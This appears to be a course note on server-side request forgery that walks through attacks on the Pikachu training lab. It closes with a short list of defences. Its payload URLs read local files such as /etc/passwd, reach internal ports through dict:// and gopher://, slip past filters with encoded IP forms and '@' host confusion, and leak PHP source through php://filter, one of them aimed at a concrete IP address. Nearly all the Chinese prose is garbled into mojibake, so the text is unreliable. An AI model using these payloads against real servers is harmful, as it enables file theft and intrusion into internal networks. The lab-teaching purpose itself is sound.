---
slug: /net-security/09/03
---

ğŸ‘‰ è¯¾ä»¶ PDFï¼š[SSRF&XXE&è¿œç¨‹ä»£ç æ‰§è¡Œ](./SSRF%20&%20XXE%20&%20Remote%20Code%20Execution.pdf)



## ç®€ä»‹

æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼ŒServer-Side Request Forgeryï¼‰ï¼Œç”±æ”»å‡»è€…é€ æˆï¼Œåœ¨æœåŠ¡å™¨å‘èµ·è¯·æ±‚çš„æ¼æ´ã€‚



![](http://img.wukaipeng.com/2023/11/04-102221-image-20231104102221145.png)

### åŸç†

åŸç†æ˜¯æœåŠ¡ç«¯æœ¬èº«å‘èµ·äº†è¯·æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹è¯¥è¯·æ±‚åšåˆç†çš„è¿‡æ»¤å’Œæ ¡éªŒã€‚



### å±å®³

1ï¸âƒ£ æ‰«æå†…ç½‘å¼€æ”¾æœåŠ¡

2ï¸âƒ£ å‘å†…ç½‘ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ payload æ¥è¿›è¡Œæ”»å‡»å†…ç½‘æœåŠ¡

3ï¸âƒ£ DOS æ”»å‡»ï¼ˆæ¯”å¦‚è¯·æ±‚å¤§æ–‡ä»¶ã€Keep-Alive Alwaysï¼‰

4ï¸âƒ£ åˆ©ç”¨å†…ç½‘çš„ Web åº”ç”¨ï¼Œæ‰§è¡Œ SQL æ³¨å…¥ã€XSS æ”»å‡»ç­‰

5ï¸âƒ£ åˆ©ç”¨ fileã€gopherã€dict åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ç­‰



## æ£€æµ‹ä¸ç»•è¿‡

### æ¼æ´æ£€æµ‹

å‡è®¾æœ‰ä¸€ä¸ªåœºæ™¯ï¼ŒæŸç½‘ç«™æ”¯æŒåœ¨çº¿åŠ è½½åŠŸèƒ½ï¼ŒæŠŠæŒ‡å®šçš„ä¸€å¼ è¿œç¨‹å›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°ï¼š

```
http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg
```

æœåŠ¡ç«¯å¤§è‡´æ­¥éª¤ï¼š

ğŸ‘ ç”¨æˆ·è¾“å…¥åœ°å€

âœŒï¸ æœåŠ¡ç«¯æ¥å—è¯·æ±‚

ğŸ¤Ÿ æ ¹æ®è¯·æ±‚å‚æ•°ä¸‹è½½è¿œç¨‹å›¾ç‰‡

ğŸ‘Š å°†å›¾ç‰‡å‘é€ç»™å‰ç«¯



è¿™é‡Œæ½œåœ¨çš„æ¼æ´ç‚¹æ˜¯ç”¨æˆ·è¾“å…¥çš„åœ°å€ï¼š

```
# ä½¿ç”¨å›ç¯åœ°å€
http://www.xxx.com/image.php?image=http://127.0.0.1:22

# ä½¿ç”¨ä¸åŒåè®®
http://www.xxx.com/image.php?image=file:///etc/passwd
http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dictå¯ä»¥å‘æœåŠ¡ç«¯
å£è¯·æ±‚data data2)
http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (å‘2233ç«¯å£å‘é€æ•°
æ®test,åŒæ ·å¯ä»¥å‘é€POSTè¯·æ±‚)
.....
```



### æ¼æ´å‡ºç°ç‚¹

ğŸ¯ **åˆ†äº«**

é€šè¿‡ URL åœ°å€åˆ†äº«æ–‡ç« ï¼Œæ¯”å¦‚ `http://share.wukaipeng.com/index.php?url=http://127.0.0.1`

ğŸ¯ **å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½**

é€šè¿‡ URL åœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ï¼Œæ¯”å¦‚ `http://image.wukaipeng.com/image.php?image=http://127.0.0.1`

ğŸ¯ **å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½**

`http://title.wukaipeng.com/title?title=http://title.geektime.com/as52ps63de`



### æ¼æ´ç»•è¿‡

ğŸš” é™åˆ¶åŸŸåä¸º `http://www.example.com` åŸŸåæ—¶

å°è¯•ä½¿ç”¨ HTTP åŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ï¼Œé€šè¿‡æ·»åŠ  @ æ¥æ„é€  URLï¼š`http://www.example.com@www.another_example.com`ï¼Œåœ¨å¯¹ @ è§£æåŸŸåæ—¶ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œä¾‹å¦‚ `http://www.aaa.com@www.bbb.com@www.ccc.com`ï¼ŒPHP çš„ `parse_url()` ä¼šè¯†åˆ«ä¸º   `www.ccc.com`ï¼Œè€Œ `libcurl` åˆ™è¯†åˆ«ä¸º `www.bbb.com`

ğŸš” é™åˆ¶è¯·æ±‚ä¸ä¸ºå†…ç½‘åœ°å€ï¼ˆé»‘åå•ï¼‰

ç¬¬ä¸€ç§æ–¹å¼ï¼šé‡‡ç”¨çŸ­ç½‘å€ç»•è¿‡

ç¬¬äºŒç§æ–¹å¼ï¼šè½¬æ¢è¿›åˆ¶

å°† `127.0.0.1` è½¬æ¢æˆå…¶ä»–è¿›åˆ¶ï¼š

- å…«è¿›åˆ¶ï¼š0177.0.0.1
- åå…­è¿›åˆ¶ï¼š0x7f.0.0.1
- åè¿›åˆ¶ï¼š2130706433

![](http://img.wukaipeng.com/2023/11/05-091343-image-20231105091343351.png)

ğŸš” é™åˆ¶åªä¸º HTTP åè®®ï¼Œä¸èƒ½æ˜¯ `file` ç­‰å…¶ä»–åè®®

é‡‡ç”¨çŸ­ç½‘å€ï¼Œæ¯”å¦‚è¦è®¿é—® `192.168.1.1`ï¼Œç”¨çŸ­ç½‘å€ç”Ÿæˆ `https://short.com/abcd`

### æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´

1. æ’é™¤æ³•ï¼šæµè§ˆå™¨æ§åˆ¶å°æŸ¥çœ‹æºä»£ç æ˜¯å¦åœ¨æœ¬åœ°å‘èµ·äº†è¯·æ±‚
2. [Dnslog](http://dnslog.cn/) ç­‰å·¥å…·æµ‹è¯•ï¼ŒæŸ¥çœ‹æ˜¯å¦è¢«è®¿é—®

3. æŠ“åŒ…åˆ†æã€‚ç”¨ WireShark æŠ“åŒ…åˆ†æã€‚
4. è®¿é—®æ—¥å¿—æ£€æŸ¥ã€‚è¯·æ±‚è¯·æ±‚å‘é€åˆ°è‡ªå·±æ§åˆ¶çš„å…¬ç½‘æœåŠ¡å™¨ï¼Œç„¶åæ£€æŸ¥è‡ªå·±å…¬ç½‘æœåŠ¡å™¨çš„æ—¥å¿—
5. æ‰«æå·¥å…·



## Pikachu æ¼”ç¤º

### SSRFï¼ˆcurlï¼‰

æ‰“å¼€ SSRF æ¨¡å—ï¼š

![](http://img.wukaipeng.com/2023/11/05-094651-image-20231105094651038.png)

è§‚å¯Ÿ URLï¼š

![](http://img.wukaipeng.com/2023/11/05-094611-image-20231105094611484.png)

> æ³¨æ„ï¼Œè¿™é‡Œ Pikachu å¹³å°æœ‰ä¸€ä¸ª bugï¼Œurl å‚æ•°åŒå†™äº† `/vul`ï¼Œè¦å»æ‰ä¸€ä¸ª

æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¯¥é“¾æ¥ï¼š

![](http://img.wukaipeng.com/2023/11/05-094901-image-20231105094901129.png)

ä¹Ÿå¯ä»¥ç”¨å…¶ä»–åè®®ï¼š

![](http://img.wukaipeng.com/2023/11/05-094957-image-20231105094957393.png)

### SSRFï¼ˆfile_get_contentsï¼‰

`file_get_contents()` å‡½æ•°å°†ä¸€æ•´ä¸ªæ–‡ä»¶ä½œä¸ºå­—ç¬¦ä¸²è¯»å…¥ã€‚

`php://filter` æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ğŸ‘‰ [php æ–‡æ¡£](https://www.php.net/manual/zh/wrappers.php.php#:~:text=php%3A%2F%2Ffilter%20php%3A%2F%2Ffilter%20%E6%98%AF%E4%B8%80%E7%A7%8D%E5%85%83%E5%B0%81%E8%A3%85%E5%99%A8%EF%BC%8C%20%E8%AE%BE%E8%AE%A1%E7%94%A8%E4%BA%8E%E6%95%B0%E6%8D%AE%E6%B5%81%E6%89%93%E5%BC%80%E6%97%B6%E7%9A%84%20%E7%AD%9B%E9%80%89%E8%BF%87%E6%BB%A4%20%E5%BA%94%E7%94%A8%E3%80%82%20%E8%BF%99%E5%AF%B9%E4%BA%8E%E4%B8%80%E4%BD%93%E5%BC%8F%EF%BC%88all-in-one%EF%BC%89%E7%9A%84%E6%96%87%E4%BB%B6%E5%87%BD%E6%95%B0%E9%9D%9E%E5%B8%B8%E6%9C%89%E7%94%A8%EF%BC%8C%E7%B1%BB%E4%BC%BC%20readfile,%E3%80%81%20file%20%28%29%20%E5%92%8C%20file_get_contents%20%28%29%20%EF%BC%8C%20%E5%9C%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96%E4%B9%8B%E5%89%8D%E6%B2%A1%E6%9C%89%E6%9C%BA%E4%BC%9A%E5%BA%94%E7%94%A8%E5%85%B6%E4%BB%96%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%82)

è®¿é—® SSRFï¼ˆfile_get_contentsï¼‰æ¨¡å—ï¼Œå¾—åˆ° URLï¼š

`http://YOUR_ADDRESS_IP:PORT/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php`

![](http://img.wukaipeng.com/2023/11/05-101842-image-20231105101842735.png)

æ”¹ä¸ºï¼š

`http://YOUR_IP_ADDRESS:PORT/vul/ssrf/ssrf_fgc.php?file=php://filter/resource=ssrf.php`

![](http://img.wukaipeng.com/2023/11/05-101933-image-20231105101933538.png)

è¿™é‡Œå…¶å®æˆ‘ä»¬å·²ç»å¾—åˆ°äº† `ssrf.php` çš„æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸å¸Œæœ›å®ƒè¢«è§£æï¼Œè€Œæ˜¯å¸Œæœ›æ‹¿åˆ° `ssrf.php` çš„æºç ï¼Œåšæ³•æ˜¯å…ˆæŠŠå®ƒåŠ å¯†æˆ base64ï¼Œç„¶åå†è§£å¯†ï¼Œä¿®æ”¹ URL ä¸ºï¼š

`http://175.178.126.31:8083/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-
encode/resource=ssrf.php`

![](http://img.wukaipeng.com/2023/11/05-102212-image-20231105102212467.png)

ç”¨ [Base64 è§£å¯†å·¥å…·](https://t.he3app.com/dt46) è§£å¯†å¾—åˆ°ï¼š

```php
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "ssrf.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR.'header.php';






?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="ssrf.php"></a>
                </li>
                <li class="active">æ¦‚è¿°</li>
            </ul>
        </div>
        <div class="page-content">

         <b>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</b>
         <p>å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯<b>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</b>,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</p>
            å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®<br>
            <br>
            æ•°æ®æµ:æ”»å‡»è€…----->æœåŠ¡å™¨---->ç›®æ ‡åœ°å€<br>
            <br>
            æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·
            <pre style="width: 500px;">
PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:
file_get_contents()
fsockopen()
curl_exec()
            </pre><br>
            å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š("æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚")çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,<b>åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤</b>ã€‚
<br>
            <br>

            ä½ å¯ä»¥æ ¹æ®"SSRF"é‡Œé¢çš„é¡¹ç›®æ¥ææ‡‚é—®é¢˜çš„åŸå› 

        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->



<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```



## é˜²å¾¡

1ï¸âƒ£ è®¾ç½® URL ç™½åå•æˆ–è€…å†…ç½‘ IP é»‘åå•

2ï¸âƒ£ è¿‡æ»¤è¿”å›ä¿¡æ¯

3ï¸âƒ£ ç¦ç”¨éå¿…é¡»åè®®ã€‚æ¯”å¦‚ä»… å…è®¸ http å’Œ https åè®®ï¼Œå…¶ä»– fileã€gopherã€ftp ä¸€å¾‹ç¦ç”¨ï¼ˆåè®®ç™½åå•ï¼‰ã€‚

















